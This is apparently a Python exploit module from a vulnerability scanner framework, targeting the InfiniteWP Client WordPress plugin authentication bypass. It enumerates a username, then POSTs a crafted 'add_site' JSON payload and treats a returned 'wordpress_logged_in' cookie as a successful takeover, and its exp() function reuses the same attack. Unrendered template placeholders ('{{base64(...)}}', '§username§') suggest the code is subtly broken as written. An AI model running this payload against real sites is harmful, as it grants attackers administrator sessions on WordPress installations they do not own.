import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WordPress InfiniteWP Client Authentication Bypass''',
        "description": '''''',
        "severity": "critical",
        "references": [
            "https://www.wordfence.com/blog/2020/01/critical-authentication-bypass-vulnerability-in-infinitewp-client-plugin/"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["wordpress", "auth-bypass", "wp-plugin"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/?author=1"""
        method = "GET"
        data = """"""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Language': 'en-US,en;q=0.9'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/"""
        method = "POST"
        data = """_IWP_JSON_PREFIX_{{base64("{\"iwp_action\":\"add_site\",\"params\":{\"username\":\"§username§\"}}")}}"""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Content-Type': 'application/x-www-form-urlencoded'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""wordpress_logged_in""" in str(resp1.headers)) and ("""<IWPHEADER>""" in resp1.text) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url